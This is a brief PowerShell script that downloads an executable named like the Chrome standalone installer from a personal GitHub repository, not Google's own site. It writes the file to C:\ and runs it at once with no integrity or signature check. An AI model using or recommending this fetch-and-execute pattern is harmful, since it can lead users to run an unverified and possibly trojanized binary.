$url = "https://github.com/Reveigh/share/raw/Client/ChromeStandaloneSetup64.exe"
$outputPath = "C:\ChromeStandaloneSetup64.exe"

# Download the executable from the GitHub repository to C:\
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Execute the downloaded executable
Start-Process -FilePath $outputPath